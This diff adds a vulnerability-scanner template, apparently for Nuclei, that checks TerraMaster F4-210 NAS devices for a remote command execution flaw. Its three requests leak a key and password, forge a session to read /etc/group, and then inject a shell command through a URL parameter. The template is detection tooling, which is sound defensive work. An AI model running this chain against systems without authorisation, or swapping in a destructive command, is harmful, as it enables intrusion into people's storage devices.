@@ -1,0 +1,92 @@
+id: terramaster-f4-210-rce
+info:
+  name: TerraMaster F4-210 Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TerraMaster F4-210 has an arbitrary command execution vulnerability. Attackers can execute arbitrary code by forging sessions through sensitive information leaks, gaining server permissions.
+  reference:
+    - https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt
+  tags: rce, critical
+
+variables:
+  timestamp: '{{unix_time()}}'
+  rand1: '{{rand_int(100000, 100100)}}'
+  rand2: '{{rand_int(5000, 5100)}}'
+
+http:
+  - raw:
+      - |
+        POST /module/api.php?mobile/wapNasIPS HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+
+    extractors:
+      - type: regex
+        name: key
+        internal: true
+        group: 1
+        regex:
+          - '"ADDR":".{6}(.*?)",'
+      - type: regex
+        name: pwd
+        internal: true
+        group: 1
+        regex:
+          - '"PWD":"(.*?)",'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PWD"
+          - "ADDR"
+
+  - raw:
+      - |
+        POST /module/api.php?mobile/fileDownload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Signature: {{md5(concat(key, timestamp))}}
+        Timestamp: {{timestamp}}
+        Authorization: {{pwd}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: kod_name=guest; kod_token={{md5(key)}}
+
+        path=%2Fetc%2Fgroup
+
+    extractors:
+      - type: regex
+        name: userlist
+        internal: true
+        group: 1
+        regex:
+          - 'admin:x:3:(.*?)\\n'
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /tos/index.php?app/del&id=0&name=;expr {{rand1}} + {{rand2}};xx# HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Signature: {{md5(concat(key, timestamp))}}
+        Timestamp: {{timestamp}}
+        Authorization: {{pwd}}
+        Cookie: kod_name={{userlist}}; kod_token={{md5(concat(key, pwd))}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{to_number(rand1) + to_number(rand2)}}"
+      - type: regex
+        regex:
+          - "expr\\s{{rand1}}\\s\\+\\s{{rand2}}"
+    matchers-condition: and
